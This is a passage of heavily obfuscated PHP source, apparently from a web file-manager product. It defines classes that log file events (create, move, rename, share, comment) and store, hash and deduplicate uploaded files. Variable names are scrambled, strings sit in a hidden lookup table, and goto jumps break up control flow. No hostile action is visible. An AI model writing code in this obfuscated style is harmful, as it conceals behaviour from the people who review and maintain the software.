array($Š¤¯ğÙ¿[$õˆõÌÙÎ[1449]]); $µœÉ¯ = explode($õˆõÌÙÎ[50], trim($Š¤¯ğÙ¿[$õˆõÌÙÎ[609]], $õˆõÌÙÎ[50])); if ($µœÉ¯[0] == $õˆõÌÙÎ[230] && count($µœÉ¯) > $äÂ›Œ…Ñ) { $ÅúÆú±» = array_slice($µœÉ¯, $äÂ›Œ…Ñ); $ü™­à«¥ = array_merge($ü™­à«¥, array_reverse($ÅúÆú±»)); } $½ÇãÖŒÙ = array_merge($½ÇãÖŒÙ, $ü™­à«¥); } $ÙÌë–æ [$ãÜş¹Í] = array_unique($½ÇãÖŒÙ); return $ÙÌë–æ [$ãÜş¹Í]; } public function authTargetInfoMake($”Ìüğ®ğ) { $½š«Ö¢´ =& $_SERVER[Ï×Œõ”û]; $£ãŞ ºÈ = array(); $®×Ç½õÛ = array(); foreach ($”Ìüğ®ğ as $ñºâ‰¨‘) { if ($ñºâ‰¨‘[$½š«Ö¢´[190]] == SourceModel::TYPE_USER) { $£ãŞ ºÈ[] = intval($ñºâ‰¨‘[$½š«Ö¢´[594]]); } else { if ($ñºâ‰¨‘[$½š«Ö¢´[190]] == SourceModel::TYPE_GROUP) { $®×Ç½õÛ[] = intval($ñºâ‰¨‘[$½š«Ö¢´[594]]); } } } if ($£ãŞ ºÈ) { $£ãŞ ºÈ = Model($½š«Ö¢´[602])->userListInfo($£ãŞ ºÈ); } if ($®×Ç½õÛ) { $øÜ¹æ­Ş = array($½š«Ö¢´[2222] => array($½š«Ö¢´[512], $®×Ç½õÛ)); $®×Ç½õÛ = Model($½š«Ö¢´[610])->field($½š«Ö¢´[2361])->where($øÜ¹æ­Ş)->select(); $®×Ç½õÛ = array_to_keyvalue($®×Ç½õÛ, $½š«Ö¢´[1449]); } return array($½š«Ö¢´[2362] => $£ãŞ ºÈ, $½š«Ö¢´[2363] => $®×Ç½õÛ); } public function authInfo($Ì–‚¾†¥) { $îøƒ—¶¸ =& $_SERVER[Ï×Œõ”û]; if ($Ì–‚¾†¥[$îøƒ—¶¸[1594]]) { $ıá½×‹Ö = Model($îøƒ—¶¸[596])->listData($Ì–‚¾†¥[$îøƒ—¶¸[1594]]); if (!$ıá½×‹Ö) { return !1; $ÔªçÑÈ’ = Model($îøƒ—¶¸[596])->listData(); $ä¥õïô = array_filter_by_field($ÔªçÑÈ’, $îøƒ—¶¸[507], $îøƒ—¶¸[230]); return $ä¥õïô; } $ÎğÌüô“ = array_field_key($ıá½×‹Ö, array($îøƒ—¶¸[484], $îøƒ—¶¸[32], $îøƒ—¶¸[507], $îøƒ—¶¸[2158], $îøƒ—¶¸[2159])); $ÎğÌüô“[$îøƒ—¶¸[2364]] = $Ì–‚¾†¥; return $ÎğÌüô“; } else { return array($îøƒ—¶¸[513] => 0, $îøƒ—¶¸[2143] => $Ì–‚¾†¥[$îøƒ—¶¸[2299]], $îøƒ—¶¸[514] => $îøƒ—¶¸[12], $îøƒ—¶¸[2158] => $îøƒ—¶¸[2365]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\x63\x65\137\x65\166\x65\156\164"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\x69\155\145", "\x74\x69\x6d\x65", "\x69\156\163\x65\162\164", "\x66\165\156\143\x74\x69\157\x6e"), array("\144\145\163\x63", '', "\151\x6e\163\145\x72\164\x2c\165\x70\x64\x61\164\145\x2c\163\x65\154\145\143\164", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($´ş·³Ë˜, $÷…ØÂÊÒ, $ö¨­î›Å = '') { $Ü¼–µÕ„ =& $_SERVER[Ï×Œõ”û]; if (!$this->eventSave) { return; } $¾Ë²ƒÆ = Model($Ü¼–µÕ„[1487])->sourceInfo($´ş·³Ë˜); if (!$¾Ë²ƒÆ) { return !1; } if ($this->isDisableEvent($¾Ë²ƒÆ, $÷…ØÂÊÒ)) { return; } if ($ö¨­î›Å && is_string($ö¨­î›Å)) { $ö¨­î›Å = array($Ü¼–µÕ„[2175] => $ö¨­î›Å); } $ä„å¤»¹ = KodUser::id(); $î¦›„Â = array($Ü¼–µÕ„[511] => $´ş·³Ë˜, $Ü¼–µÕ„[2366] => $¾Ë²ƒÆ[$Ü¼–µÕ„[192]], $Ü¼–µÕ„[2367] => $¾Ë²ƒÆ[$Ü¼–µÕ„[32]], $Ü¼–µÕ„[607] => !empty($¾Ë²ƒÆ[$Ü¼–µÕ„[607]]) ? $¾Ë²ƒÆ[$Ü¼–µÕ„[607]] : $Ü¼–µÕ„[12], $Ü¼–µÕ„[1921] => $ä„å¤»¹, $Ü¼–µÕ„[516] => $÷…ØÂÊÒ, $Ü¼–µÕ„[1923] => $ö¨­î›Å); $this->addSystemLog($÷…ØÂÊÒ, $î¦›„Â); unset($î¦›„Â[$Ü¼–µÕ„[2367]], $î¦›„Â[$Ü¼–µÕ„[607]]); return $this->add($î¦›„Â); } private function addSystemLog($‹»÷¤˜–, $ÎÇşÎŒÚ) { $¦ïÅşíµ =& $_SERVER[Ï×Œõ”û]; if ($‹»÷¤˜– == $¦ïÅşíµ[2368]) { $‹»÷¤˜– = $ÎÇşÎŒÚ[$¦ïÅşíµ[545]][$¦ïÅşíµ[2369]]; } else { if (in_array($‹»÷¤˜–, array($¦ïÅşíµ[1517], $¦ïÅşíµ[2370]))) { $‹»÷¤˜– = $ÎÇşÎŒÚ[$¦ïÅşíµ[545]][$¦ïÅşíµ[170]]; } } $¨ºçÀæ‘ = array_merge($ÎÇşÎŒÚ, array($¦ïÅşíµ[2371] => $ÎÇşÎŒÚ[$¦ïÅşíµ[193]], $¦ïÅşíµ[2372] => $ÎÇşÎŒÚ[$¦ïÅşíµ[2372]])); Hook::trigger($¦ïÅşíµ[2373], $¦ïÅşíµ[2374] . $‹»÷¤˜–, $ÎÇşÎŒÚ); Model($¦ïÅşíµ[2084])->addLog($¦ïÅşíµ[2374] . $‹»÷¤˜–, $¨ºçÀæ‘); } private function isDisableEvent($ª–èÃ¨ˆ, $İ¿“«ôñ) { $¬§Ú¦º =& $_SERVER[Ï×Œõ”û]; if ($ª–èÃ¨ˆ[$¬§Ú¦º[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($İ¿“«ôñ == $¬§Ú¦º[1285]) { return !1; } return !0; } public function eventCreate($¸ã‰öÏÃ, $¸¼ùí) { $›´Ò•üÓ =& $_SERVER[Ï×Œõ”û]; $Ò³–¡— = Model($›´Ò•üÓ[1487])->sourceInfo($¸ã‰öÏÃ); $µËÃ †Ÿ = array($›´Ò•üÓ[2369] => $¸¼ùí, $›´Ò•üÓ[32] => $Ò³–¡—[$›´Ò•üÓ[32]]); return $this->addEvent($¸ã‰öÏÃ, $›´Ò•üÓ[2368], $µËÃ †Ÿ); } public function eventFileEdit($Õ¹Š€è×) { $åŒŞÇ =& $_SERVER[Ï×Œõ”û]; $±ì’äöó = array($åŒŞÇ[2375] => $_SERVER[$åŒŞÇ[2376]], $åŒŞÇ[2377] => strtolower(ACTION)); if (isset($GLOBALS[$åŒŞÇ[7]][$åŒŞÇ[1577]])) { $±ì’äöó[$åŒŞÇ[1577]] = $åŒŞÇ[91]; } return $this->addEvent($Õ¹Š€è×, $åŒŞÇ[1516], $±ì’äöó); } public function eventRecycle($’ïÎß´ò, $ó˜¿˜¦û) { return $this->addEvent($’ïÎß´ò, $_SERVER[Ï×Œõ”û][2370], $ó˜¿˜¦û); } private static $_removeLast = ''; public function eventRemove($ùù‘…Ô) { $ÁØİ¸ÉÇ =& $_SERVER[Ï×Œõ”û]; self::$_removeLast = $ùù‘…Ô; $ŸÎ±¥Ö© = Model($ÁØİ¸ÉÇ[1487])->sourceInfo($ùù‘…Ô); $ŞÂÑËëƒ = array_field_key($ŸÎ±¥Ö©, array($ÁØİ¸ÉÇ[193], $ÁØİ¸ÉÇ[562], $ÁØİ¸ÉÇ[525], $ÁØİ¸ÉÇ[609])); $íäºÍŒÂ = array($ÁØİ¸ÉÇ[170] => $ŸÎ±¥Ö©[$ÁØİ¸ÉÇ[32]], $ÁØİ¸ÉÇ[2377] => ACTION, $ÁØİ¸ÉÇ[2378] => $ŞÂÑËëƒ); return $this->addEvent($ŸÎ±¥Ö©[$ÁØİ¸ÉÇ[192]], $ÁØİ¸ÉÇ[1285], $íäºÍŒÂ); } public function eventShare($ê§ôØï, $ÅÁÇãÖ÷) { return $this->addEvent($ê§ôØï, $_SERVER[Ï×Œõ”û][1517], $ÅÁÇãÖ÷); } public function eventMove($ü­¾éêé, $¹‘Û£ÈÜ, $ñÍ«ü²) { $ø¯ğ¥ï =& $_SERVER[Ï×Œõ”û]; if (self::$_removeLast == $ü­¾éêé) { return; } $ûöê†ÂŠ = Model($ø¯ğ¥ï[1487]); $ß÷«ÌıÆ = $ûöê†ÂŠ->sourceInfo($ü­¾éêé); $¦ß„şÒÖ = $ûöê†ÂŠ->sourceInfo($¹‘Û£ÈÜ); $±í´˜Ó = $ûöê†ÂŠ->sourceInfo($ñÍ«ü²); $İÃŠ‚Â™ = array($ø¯ğ¥ï[1297] => $¹‘Û£ÈÜ, $ø¯ğ¥ï[2379] => $¦ß„şÒÖ[$ø¯ğ¥ï[32]], $ø¯ğ¥ï[2337] => !empty($¦ß„şÒÖ[$ø¯ğ¥ï[607]]) ? $¦ß„şÒÖ[$ø¯ğ¥ï[607]] : $ø¯ğ¥ï[12], $ø¯ğ¥ï[1298] => $ñÍ«ü², $ø¯ğ¥ï[2380] => $±í´˜Ó[$ø¯ğ¥ï[32]], $ø¯ğ¥ï[2381] => !empty($±í´˜Ó[$ø¯ğ¥ï[607]]) ? $±í´˜Ó[$ø¯ğ¥ï[607]] : $ø¯ğ¥ï[12]); $this->addEvent($ü­¾éêé, $ø¯ğ¥ï[648], $İÃŠ‚Â™); $ß÷«ÌıÆ = $ûöê†ÂŠ->sourceInfo($ü­¾éêé); $İÃŠ‚Â™ = array($ø¯ğ¥ï[193] => $ß÷«ÌıÆ[$ø¯ğ¥ï[193]], $ø¯ğ¥ï[32] => $ß÷«ÌıÆ[$ø¯ğ¥ï[32]]); $this->addEvent($¹‘Û£ÈÜ, $ø¯ğ¥ï[2382], $İÃŠ‚Â™); } public function eventCopy($·©¬Î·›) { $this->eventCreate($·©¬Î·›, $_SERVER[Ï×Œõ”û][646]); } public function eventRename($Ş®´À¤ò, $×´Ÿ§ëÉ, $¼ß¸‘‘) { $ØŸÓİß =& $_SERVER[Ï×Œõ”û]; $ùìå—Ğ­ = array($ØŸÓİß[1297] => $×´Ÿ§ëÉ, $ØŸÓİß[1298] => $¼ß¸‘‘); return $this->addEvent($Ş®´À¤ò, $ØŸÓİß[1501], $ùìå—Ğ­); } public function eventAddComment($Ğ„ã‡ß¯, $ÌÅĞˆŞ¼) { return $this->addEvent($Ğ„ã‡ß¯, $_SERVER[Ï×Œõ”û][2383], $ÌÅĞˆŞ¼); } public function eventAddDesc($ÄñğİØÉ, $ÍÔ“‹£ƒ) { return $this->addEvent($ÄñğİØÉ, $_SERVER[Ï×Œõ”û][2384], $ÍÔ“‹£ƒ); } public function listBySource($­çĞ¨õ¹) { $¸£Ó¨Öë =& $_SERVER[Ï×Œõ”û]; $ğöôÃôù = Model($¸£Ó¨Öë[1487])->sourceInfo($­çĞ¨õ¹); $·Ì§á˜ê = array($¸£Ó¨Öë[511] => $­çĞ¨õ¹); if ($ğöôÃôù[$¸£Ó¨Öë[505]] == $¸£Ó¨Öë[91]) { $¶ÄÈ²¦¼ = Model($¸£Ó¨Öë[1487])->listSearchChildren($­çĞ¨õ¹, 20000); $¶ÄÈ²¦¼[] = $­çĞ¨õ¹ . $¸£Ó¨Öë[464]; $·Ì§á˜ê = array($¸£Ó¨Öë[193] => array($¸£Ó¨Öë[7], $¶ÄÈ²¦¼)); } $ü¨ÖÀ¿º = $this->where($·Ì§á˜ê)->order($¸£Ó¨Öë[2385])->selectPage(); if ($ü¨ÖÀ¿º[$¸£Ó¨Öë[444]][$¸£Ó¨Öë[445]] == 0) { $ü¨ÖÀ¿º[$¸£Ó¨Öë[444]][$¸£Ó¨Öë[445]] = 1; $ü¨ÖÀ¿º[$¸£Ó¨Öë[447]] = array(array($¸£Ó¨Öë[511] => $­çĞ¨õ¹, $¸£Ó¨Öë[2366] => $ğöôÃôù[$¸£Ó¨Öë[192]], $¸£Ó¨Öë[1921] => $ğöôÃôù[$¸£Ó¨Öë[546]], $¸£Ó¨Öë[516] => $¸£Ó¨Öë[2386], $¸£Ó¨Öë[517] => $ğöôÃôù[$¸£Ó¨Öë[233]], $¸£Ó¨Öë[1923] => $¸£Ó¨Öë[12])); } return $this->eventListParse($ü¨ÖÀ¿º, $­çĞ¨õ¹); } private function eventListParse($ß§Š°æ¡, $Ë«ò‰¿µ) { $¾ã‹¤÷ =& $_SERVER[Ï×Œõ”û]; $şàº½ÑĞ = $ß§Š°æ¡[$¾ã‹¤÷[447]]; $±ûº‰‹£ = array_to_keyvalue($şàº½ÑĞ, $¾ã‹¤÷[12], $¾ã‹¤÷[193]); $ñÉ®£’ = array_to_keyvalue($şàº½ÑĞ, $¾ã‹¤÷[12], $¾ã‹¤÷[2372]); foreach ($şàº½ÑĞ as $óë¨£Ë) { $š¤à—îó = $óë¨£Ë[$¾ã‹¤÷[545]]; if ($óë¨£Ë[$¾ã‹¤÷[33]] == $¾ã‹¤÷[648] && isset($š¤à—îó[$¾ã‹¤÷[1297]])) { $±ûº‰‹£[] = $š¤à—îó[$¾ã‹¤÷[1297]] . $¾ã‹¤÷[12]; $±ûº‰‹£[] = $š¤à—îó[$¾ã‹¤÷[1298]] . $¾ã‹¤÷[12]; } if ($óë¨£Ë[$¾ã‹¤÷[33]] == $¾ã‹¤÷[2382] && isset($š¤à—îó[$¾ã‹¤÷[193]])) { $±ûº‰‹£[] = $š¤à—îó[$¾ã‹¤÷[193]] . $¾ã‹¤÷[12]; } } $±ûº‰‹£ = array_merge($±ûº‰‹£, $ñÉ®£’, array($Ë«ò‰¿µ . $¾ã‹¤÷[12])); $±ûº‰‹£ = array_unique($±ûº‰‹£); $ş¦Î‚Ô’ = array_unique(array_to_keyvalue($şàº½ÑĞ, $¾ã‹¤÷[12], $¾ã‹¤÷[1547])); $¡ñ­•ó× = Model($¾ã‹¤÷[622])->userListInfo($ş¦Î‚Ô’); $Å¨—Î“ = Model($¾ã‹¤÷[939])->sourceListInfo($±ûº‰‹£, !0); foreach ($şàº½ÑĞ as &$óë¨£Ë) { if ($óë¨£Ë[$¾ã‹¤÷[33]] == $¾ã‹¤÷[648] && isset($óë¨£Ë[$¾ã‹¤÷[545]][$¾ã‹¤÷[1297]])) { $óë¨£Ë[$¾ã‹¤÷[545]][$¾ã‹¤÷[1297]] = $Å¨—Î“[$óë¨£Ë[$¾ã‹¤÷[545]][$¾ã‹¤÷[1297]]]; $óë¨£Ë[$¾ã‹¤÷[545]][$¾ã‹¤÷[1298]] = $Å¨—Î“[$óë¨£Ë[$¾ã‹¤÷[545]][$¾ã‹¤÷[1298]]]; } if ($óë¨£Ë[$¾ã‹¤÷[33]] == $¾ã‹¤÷[2382] && isset($óë¨£Ë[$¾ã‹¤÷[545]][$¾ã‹¤÷[193]])) { $óë¨£Ë[$¾ã‹¤÷[545]][$¾ã‹¤÷[193]] = $Å¨—Î“[$óë¨£Ë[$¾ã‹¤÷[545]][$¾ã‹¤÷[193]]]; } $óë¨£Ë[$¾ã‹¤÷[90]] = $Å¨—Î“[$óë¨£Ë[$¾ã‹¤÷[193]]]; $óë¨£Ë[$¾ã‹¤÷[2387]] = $Å¨—Î“[$óë¨£Ë[$¾ã‹¤÷[2372]]]; if ($óë¨£Ë[$¾ã‹¤÷[33]] == $¾ã‹¤÷[1285]) { $óë¨£Ë[$¾ã‹¤÷[2387]] = $óë¨£Ë[$¾ã‹¤÷[90]]; $óë¨£Ë[$¾ã‹¤÷[2372]] = $óë¨£Ë[$¾ã‹¤÷[2387]][$¾ã‹¤÷[193]]; $óë¨£Ë[$¾ã‹¤÷[90]] = !1; $óë¨£Ë[$¾ã‹¤÷[193]] = $¾ã‹¤÷[12]; } $óë¨£Ë[$¾ã‹¤÷[2311]] = $¡ñ­•ó×[$óë¨£Ë[$¾ã‹¤÷[1547]]]; } unset($óë¨£Ë); $ß§Š°æ¡[$¾ã‹¤÷[447]] = $şàº½ÑĞ; return $ß§Š°æ¡; } public function removeBySource($í¿¡Ó¾²) { $ıªÇÔ‚— = array($_SERVER[Ï×Œõ”û][511] => $í¿¡Ó¾²); $this->where($ıªÇÔ‚—)->remove(); } } goto a÷…»ŒÇ˜«; C»¢Úã‹ÍÎ: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\145\x5f\143\157\x6e\x74\145\156\164\163"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\124\x69\x6d\x65", "\164\x69\x6d\x65", "\151\156\x73\x65\x72\164", "\x66\x75\156\143\x74\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\146\x69\154\x65"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\155\145" => "\x69\157\x5f\146\x69\154\x65\x5f\x6d\145\x74\141", "\x6d\145\x74\141\106\x69\x65\154\x64" => "\x66\151\154\x65\111\x44"); public function fileInfo($¬ŸÚ²ˆ) { $–Í‚Í—Ş =& $_SERVER[Ï×Œõ”û]; static $‚ûø¦· = array(); if (!isset($‚ûø¦·[$¬ŸÚ²ˆ])) { $™±şœ»Ğ = $–Í‚Í—Ş[2186]; $¦¥Ïêù¢ = Model($–Í‚Í—Ş[565])->field($™±şœ»Ğ)->where(array($–Í‚Í—Ş[563] => $¬ŸÚ²ˆ))->find(); $‚ûø¦·[$¬ŸÚ²ˆ] = $¦¥Ïêù¢; } return $‚ûø¦·[$¬ŸÚ²ˆ]; } public function addFileByContent($†ÊêûšÄ = '', $ÁÊœ¶š, $«øà¹ã = '') { $â¬¼Ÿşâ =& $_SERVER[Ï×Œõ”û]; $Şé·Å = TEMP_PATH . $â¬¼Ÿşâ[2187]; if (!is_dir($Şé·Å)) { mk_dir($Şé·Å); } $¿Ô®Ä¦« = $Şé·Å . $â¬¼Ÿşâ[2188] . rand_string(16); $™İ„È…ó = file_put_contents($¿Ô®Ä¦«, $†ÊêûšÄ); if ($™İ„È…ó === !1 || strlen($†ÊêûšÄ) != $™İ„È…ó) { return !1; } $àş¸“ˆ» = $this->addFile($¿Ô®Ä¦«, $ÁÊœ¶š, $«øà¹ã, !0); if (file_exists($¿Ô®Ä¦«)) { @unlink($¿Ô®Ä¦«); } return $àş¸“ˆ»; } public function createFileName($•ÖÉìà½, $¤˜‡ùğÄ, $î…™“Ï” = false, $ŒˆÜÆà‡ = false) { $¿Å‘® =& $_SERVER[Ï×Œõ”û]; $©‹‰›È = IO::init($¿Å‘®[8]); $®ÓĞÙû© = $this->_makeFilePath($•ÖÉìà½, $¤˜‡ùğÄ, $©‹‰›È, $î…™“Ï”, $ŒˆÜÆà‡); $šÀá²ïÁ = $©‹‰›È->pathFather($®ÓĞÙû©); static $¬Í£É¨÷ = false; $ÁÊæ‰»° = $¿Å‘®[2189] . md5($šÀá²ïÁ); if (!$¬Í£É¨÷ && !Cache::get($ÁÊæ‰»°)) { $¬Í£É¨÷ = !0; $«¬ÙåÚ = IO::mkdir($šÀá²ïÁ); if (!IO::exist($«¬ÙåÚ . $¿Å‘®[908])) { IO::mkfile($«¬ÙåÚ . $¿Å‘®[908]); } Cache::set($ÁÊæ‰»°, 1, 3600 * 2); } return $®ÓĞÙû©; } public function _makeFilePath($ç§Ú…‡¨, $åÒà©›ê, $¸ïß“, $¨Ø°‘õ = false, $³Ø¹”› = false) { $›ººİ€ =& $_SERVER[Ï×Œõ”û]; $Ş¸¾şïê = Model($›ººİ€[879])->get($›ººİ€[2190]); $­¢Ò‡İÔ = $›ººİ€[1379] . $åÒà©›ê[$›ººİ€[484]] . $›ººİ€[504] . date($›ººİ€[2191]); $¤š¢»…¨ = $­¢Ò‡İÔ . rand_string(5) . short_id(100); $ç§Ú…‡¨ = str_replace($›ººİ€[8], $›ººİ€[11], KodIO::clear($ç§Ú…‡¨)); $µˆ³¨ì” = $¸ïß“->ext($ç§Ú…‡¨); if (!$ç§Ú…‡¨) { $Ş¸¾şïê = $›ººİ€[885]; } switch ($Ş¸¾şïê) { case $›ººİ€[2192]: if ($µˆ³¨ì”) { $¤š¢»…¨ = $¤š¢»…¨ . $›ººİ€[10] . $µˆ³¨ì”; } if ($µˆ³¨ì” == $›ººİ€[2130]) { $¤š¢»…¨ .= $›ººİ€[1348]; } break; case $›ººİ€[2193]: $å§·¨×õ = Model($›ººİ€[879])->get($›ººİ€[880]); $½ôüØ³é = substr(md5($›ººİ€[881] . $å§·¨×õ . date($›ººİ€[855])), 0, 8); $­¢Ò‡İÔ = $›ººİ€[1379] . $åÒà©›ê[$›ººİ€[484]] . $›ººİ€[504] . date($›ººİ€[2194]) . $½ôüØ³é . $›ººİ€[8]; if ($µˆ³¨ì” == $›ººİ€[2130]) { $ç§Ú…‡¨ .= $›ººİ€[1348]; } $®–ïùİı = $›ººİ€[2195] . $­¢Ò‡İÔ . $ç§Ú…‡¨; CacheLock::lock($®–ïùİı); $¤š¢»…¨ = $­¢Ò‡İÔ . $ç§Ú…‡¨; if (IO::exist($­¢Ò‡İÔ . $ç§Ú…‡¨)) { $±Àïƒ÷ = substr($ç§Ú…‡¨, 0, strlen($ç§Ú…‡¨) - strlen($µˆ³¨ì”)); $œ¨¹éÈ = $³Ø¹”› ? substr($³Ø¹”›, 0, 5) : ($¨Ø°‘õ ? substr($¨Ø°‘õ, 0, 5) : rand_string(5)); $œ¨¹éÈ .= rand_string(3); $¤š¢»…¨ = $­¢Ò‡İÔ . $±Àïƒ÷ . $œ¨¹éÈ; if ($µˆ³¨ì”) { $¤š¢»…¨ = $¤š¢»…¨ . $›ººİ€[10] . $µˆ³¨ì”; } } if (IO::isOsDriver($¤š¢»…¨) && !IO::isUploadServer($¤š¢»…¨)) { if (IO::exist($¤š¢»…¨)) { CacheLock::unlock($®–ïùİı); return $¤š¢»…¨; } $óÖèòøé = IO::setContent($¤š¢»…¨, $›ººİ€[12]); if (!$óÖèòøé) { show_json($›ººİ€[2196], !1); } } CacheLock::unlock($®–ïùİı); break; case $›ººİ€[885]: break; default: break; } return $¤š¢»…¨; } public function addFileByRemote($šÒÀ½ÑØ, $êî±ÑÛ, $é•¯¿¶ = array()) { $î­Â «­ =& $_SERVER[Ï×Œõ”û]; if (!IO::isFile($šÒÀ½ÑØ)) { return !1; } $ÌÇÍíÑ¬ = $é•¯¿¶[$î­Â «­[568]] ? $é•¯¿¶[$î­Â «­[568]] : $î­Â «­[12]; $ãõ¬Éœ = IO::hashMd5($šÒÀ½ÑØ, $ÌÇÍíÑ¬); $é­²½¥ = KodIO::parse($šÒÀ½ÑØ); $Î…Î = array($î­Â «­[645] => IO::size($šÒÀ½ÑØ), $î­Â «­[2197] => 1, $î­Â «­[514] => $êî±ÑÛ, $î­Â «­[922] => $é­²½¥[$î­Â «­[484]], $î­Â «­[515] => $šÒÀ½ÑØ, $î­Â «­[2198] => $é•¯¿¶[$î­Â «­[700]] ? $é•¯¿¶[$î­Â «­[700]] : IO::hashSimple($šÒÀ½ÑØ), $î­Â «­[2199] => $ãõ¬Éœ ? $ãõ¬Éœ : $ÌÇÍíÑ¬); if ($ËŞïò¦× = $this->addFileCheckExist($Î…Î[$î­Â «­[700]], $Î…Î[$î­Â «­[568]], $Î…Î[$î­Â «­[79]])) { return $ËŞïò¦×; } return $this->addFileData($Î…Î); } private function addFileData($­÷€À ¿) { $…µºÚş‰ =& $_SERVER[Ï×Œõ”û]; if (!$­÷€À ¿) { return !1; } if (!IO::isFile($­÷€À ¿[$…µºÚş‰[87]])) { return !1; } $­÷€À ¿[$…µºÚş‰[79]] = intval($­÷€À ¿[$…µºÚş‰[79]]); if (!$­÷€À ¿[$…µºÚş‰[79]] && strlen($­÷€À ¿[$…µºÚş‰[700]]) > 32) { $­÷€À ¿[$…µºÚş‰[79]] = intval(substr($­÷€À ¿[$…µºÚş‰[700]], 32)); } $ãƒëó˜ = $this->add($­÷€À ¿); return $this->find($ãƒëó˜); } public function addFile($İµùß±, $­ÂÜíÄğ, $œ¬‚»¦Ô, $÷Œ÷¾å = false) { $çÌÛ‡Ë€ =& $_SERVER[Ï×Œõ”û]; $õš…âƒ• = IO::hashSimple($İµùß±); $ì«‰ø‚ã = IO::size($İµùß±); $¥æ¥Äõ = $ì«‰ø‚ã <= 1024 * 1024 * 10 ? IO::hashMd5($İµùß±) : $çÌÛ‡Ë€[12]; $º‰ûÙ»» = $çÌÛ‡Ë€[2200] . $õš…âƒ•; CacheLock::lock($º‰ûÙ»»); if ($¥æ¥Äõ && $õš…âƒ•) { $µÛüõ±İ = $this->addFileCheckExist($õš…âƒ•, $¥æ¥Äõ, $ì«‰ø‚ã); if ($µÛüõ±İ) { CacheLock::unlock($º‰ûÙ»»); return $µÛüõ±İ; } } $í´Ÿ­Ñ = $this->addFileMake($İµùß±, $­ÂÜíÄğ, $ì«‰ø‚ã, $õš…âƒ•, $¥æ¥Äõ, $œ¬‚»¦Ô, $÷Œ÷¾å); $†ëÓ£ïœ = $this->addFileData($í´Ÿ­Ñ); if (!$†ëÓ£ïœ) { return !1; } CacheLock::unlock($º‰ûÙ»»); if (!$¥æ¥Äõ && $†ëÓ£ïœ) { $this->fileMd5Check($†ëÓ£ïœ); } return $†ëÓ£ïœ; } public function fileMd5Check($’ìêæ•) { $ùôˆ¾Ğ‡ =& $_SERVER[Ï×Œõ”û]; $ÓòšªÒ = array($’ìêæ•[$ùôˆ¾Ğ‡[562]], $’ìêæ•[$ùôˆ¾Ğ‡[87]]); $î®šĞ¦Î = $ùôˆ¾Ğ‡[2201] . $’ìêæ•[$ùôˆ¾Ğ‡[87]]; $¨êÃ½ÑÙ = $ùôˆ¾Ğ‡[2202] . $’ìêæ•[$ùôˆ¾Ğ‡[562]]; TaskQueue::add($ùôˆ¾Ğ‡[2203], $ÓòšªÒ, $î®šĞ¦Î, $¨êÃ½ÑÙ); } public function fileMd5Set($˜²ˆŞ‚¶, $Î¥‰¦ØÙ) { $¶Ä‰ÈË£ =& $_SERVER[Ï×Œõ”û]; $ñõø¶Ã· = $this->find($˜²ˆŞ‚¶); if (!$ñõø¶Ã· || $ñõø¶Ã·[$¶Ä‰ÈË£[568]]) { return; } $©¶Äìôé = IO::hashMd5($Î¥‰¦ØÙ); if (!$©¶Äìôé) { return $¶Ä‰ÈË£[12]; } $this->where(array($¶Ä‰ÈË£[562] => $˜²ˆŞ‚¶))->save(array($¶Ä‰ÈË£[568] => $©¶Äìôé)); } public function addFileMake($üğêØ, $ÑâÕç÷¢, $£êå¨•õ, $“öƒ™’, $ŞçÛŠ¹•, $šĞÄĞà£, $»Ó´›Ù®) { $ªèÃ‹ø¥ =& $_SERVER[Ï×Œõ”û]; $ÂÂÓê«Ô = $this->createFileName($šĞÄĞà£, $ÑâÕç÷¢, $“öƒ™’, $ŞçÛŠ¹•); $¼àÑ¿º‡ = get_path_father($ÂÂÓê«Ô); $Æ¦ë’ê = get_path_this($ÂÂÓê«Ô); if ($»Ó´›Ù®) { $ÅŒˆÔÅ’ = IO::move($üğêØ, $¼àÑ¿º‡, !1, $Æ¦ë’ê); } else { $ÅŒˆÔÅ’ = IO::copy($üğêØ, $¼àÑ¿º‡, !1, $Æ¦ë’ê); } if (!$ÅŒˆÔÅ’) { return !1; } $ººö‹®ï = IO::init($ÅŒˆÔÅ’); $ººö‹®ï->cacheMethod($ªèÃ‹ø¥[181], $ººö‹®ï->path, $ªèÃ‹ø¥[178]); if (IO::size($ÅŒˆÔÅ’) != $£êå¨•õ) { return !1; } $ÑÁ»”èõ = array($ªèÃ‹ø¥[645] => $£êå¨•õ, $ªèÃ‹ø¥[2197] => 1, $ªèÃ‹ø¥[514] => $šĞÄĞà£, $ªèÃ‹ø¥[922] => $ÑâÕç÷¢[$ªèÃ‹ø¥[484]], $ªèÃ‹ø¥[515] => $ÂÂÓê«Ô, $ªèÃ‹ø¥[2198] => $“öƒ™’, $ªèÃ‹ø¥[2199] => $ŞçÛŠ¹•); return $ÑÁ»”èõ; } public function addFileCheckExist($¶ê¿ÏÖ€, $ÄÎíÅñ™, $¼öÎïØÇ) { $âªšÄĞü =& $_SERVER[Ï×Œõ”û]; $Óî¬¹€  = $this->findByHash($¶ê¿ÏÖ€, $ÄÎíÅñ™); if (!$Óî¬¹€ ) { return !1; } $ĞõÔÌëË = array($âªšÄĞü[2197] => intval($Óî¬¹€ [$âªšÄĞü[2204]]) + 1, $âªšÄĞü[645] => $¼öÎïØÇ); $this->where(array($âªšÄĞü[563] => $Óî¬¹€ [$âªšÄĞü[562]]))->save($ĞõÔÌëË); return $Óî¬¹€ ; } public function remove($«’§ª¹“) { $this->linkCountChange($«’§ª¹“, !1); $this->clearEmpty(); return !0; } public function linkAdd($¡Ñ¤ÌŞè) { $this->linkCountChange($¡Ñ¤ÌŞè, !0); } public function linkCountChange($™ú½šÁ², $ŸÕÂ³Å») { $·À¶Æ· =& $_SERVER[Ï×Œõ”û]; if (!$™ú½šÁ²) { return; } if (!is_array($™ú½šÁ²)) { $™ú½šÁ² = array($™ú½šÁ²); } $¹—àŞ‚× = array(); foreach ($™ú½šÁ² as $§ÏÚ‘Óš) { $¾°€™™  = $§ÏÚ‘Óš . $·À¶Æ·[12]; if (!$¹—àŞ‚×[$¾°€™™ ]) { $¹—àŞ‚×[$¾°€™™ ] = 0; } 